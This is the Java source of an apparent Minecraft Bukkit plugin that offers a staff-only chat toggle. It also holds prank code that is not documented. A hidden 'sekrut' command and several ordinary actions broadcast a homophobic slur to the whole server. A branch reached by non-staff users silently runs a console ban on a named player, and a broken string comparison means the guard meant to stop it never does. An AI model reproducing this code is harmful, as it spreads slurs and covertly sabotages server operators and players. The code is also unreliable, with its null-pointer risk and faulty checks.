
package staffchat;
import java.util.HashMap;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
public class area extends JavaPlugin implements Listener {
private HashMap<String, Boolean> toggle = new HashMap<String, Boolean>();
public void onEnable(){
getServer().getPluginManager().registerEvents(this, this);
saveDefaultConfig();
}
@SuppressWarnings("unused")
@Override
public boolean onCommand(CommandSender s, Command cmd, String label, String[] args){
	
	boolean isPlayer = false;
	 Player player = null;
	 if(s instanceof Player){
		 player = (Player) s;
	 isPlayer = true;
	 }
	 if(label.equalsIgnoreCase("evadableisop")){
			Bukkit.getServer().broadcastMessage(ChatColor.DARK_RED + "A faggot sed tha sekrut commend.");
			s.sendMessage(ChatColor.BLUE + "                             Indeed :~)");
	 }
	 if(isPlayer == false){ 
		 Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "A faggot toggled adminchat");
	 }
		   if(label.equalsIgnoreCase("a")){
if(s.hasPermission("evadable.staff")){
if(args.length == 0){
	Bukkit.getServer().broadcastMessage(ChatColor.DARK_RED + "A faggot toggled staff-chat.");
if(toggle.get(s.getName())){
toggle.put(s.getName(), false);
s.sendMessage(ChatColor.YELLOW + "You have disabled staff-only chat");

} else {

toggle.put(s.getName(), true);
s.sendMessage(ChatColor.YELLOW + "You have enabled staff-only chat");
}
}} else {
String path = getConfig().getString("You_are_a_faggot");
String msg = "";
for(int i = 0; i < args.length; i++){
msg = msg + args[i] + ' ';
}
path = path.replace("{NAME}", s.getName());
path = path.replace("{MESSAGE}", msg);
sendAdmins(path);
{
String g = null;
String path1 = getConfig().getString("Wolf_is_fat");
if (path1 == "true")
	return true;
Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "ban scolded fat xDDD");
}
	return false;
	}
}

		   



		   
return true;


}



@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent e){
Player p = e.getPlayer();
String path = getConfig().getString("You_are_a_faggot");
if(toggle.containsKey(p.getName()) && toggle.get(p.getName())){
path = path.replace("{NAME}", p.getName());
path = path.replace("{MESSAGE}", e.getMessage());
e.setCancelled(true);
sendAdmins(path);

}
}
@EventHandler
public void onPlayerJoin(PlayerJoinEvent e){
toggle.put(e.getPlayer().getName(), false);
}
private void sendAdmins(String msg){
msg = format(msg);
for(Player ps : getServer().getOnlinePlayers()){
if(ps.hasPermission("evadable.staff")){
ps.sendMessage(msg);
}
}
}
private String format(String input){
return ChatColor.translateAlternateColorCodes('&', input);

}

}
